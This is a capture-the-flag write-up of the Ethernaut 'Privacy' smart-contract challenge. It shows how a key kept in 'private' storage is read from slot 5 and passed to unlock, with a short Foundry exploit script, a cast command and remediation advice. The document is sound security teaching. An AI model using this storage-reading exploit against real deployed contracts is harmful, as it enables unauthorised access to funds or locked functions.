# Privacy — Security Writeup

| | |
|---|---|
| **Challenge** | [Ethernaut 13 — Privacy](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-privacy) |
| **Platform** | Smart Contracts Hacking (SCH) / OpenZeppelin Ethernaut |
| **Target** | `src/Privacy.sol` |
| **Solidity** | `^0.8.0` |
| **Severity** | Critical (for any “secret” stored this way) |
| **Status** | Exploited — local PoC passing |

---

## Executive summary

The unlock key is `bytes16(data[2])`, stored in a `private` fixed array. On Ethereum all storage is public. Reading slot **5**, casting to `bytes16`, and calling `unlock` clears `locked`.

Same lesson as Vault: **`private` is an ABI restriction, not encryption.**

---

## Challenge objectives

| # | Condition | How verified |
|---|-----------|--------------|
| 1 | Unlocked | `privacyInstance.locked() == false` |

---

## Finding

### [C-01] Cleartext key in contract storage

| Field | Detail |
|-------|--------|
| **Severity** | Critical |
| **Bug class** | Sensitive data exposure |
| **Location** | `data[2]` @ storage slot 5 |
| **SWC** | [SWC-136](https://swcregistry.io/docs/SWC-136) |

#### Layout

| Slot | Content |
|------|---------|
| 0 | `locked` |
| 1 | `ID` |
| 2 | packed small ints |
| 3–5 | `data[0..2]` |

#### Proof of concept

```bash
cd web3-ctf-challenges/13-ethernaut-privacy
forge test --match-test testExploit -vv
```

**Result:**

```
[PASS] testExploit() (gas: 42009)
```

---

## Exploit implementation

### SCH (`Exploit.s.sol`)

```solidity
function run() external {
    vm.startBroadcast(PLAYER_PRIVATE_KEY);

    bytes32 slot = vm.load(address(privacyInstance), bytes32(uint256(5)));
    privacyInstance.unlock(bytes16(slot));

    vm.stopBroadcast();
}
```

Off-platform: `cast storage <privacy> 5` then unlock with the high 16 bytes.

---

## Remediation

Never store unlock secrets on-chain. Prefer signatures, commit-reveal with off-chain preimage, or ZK.

---

## Key lessons

1. **`private` ≠ confidential**
2. **Map storage packing** — arrays of `bytes32` occupy consecutive slots
3. **`bytes16(bytes32)`** truncates to the higher-order half

---

## References

- [SCH Privacy challenge](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-privacy)
- [SWC-136](https://swcregistry.io/docs/SWC-136)
- Local: `Exploit.s.sol`, `test/PrivacyExploit.t.sol`
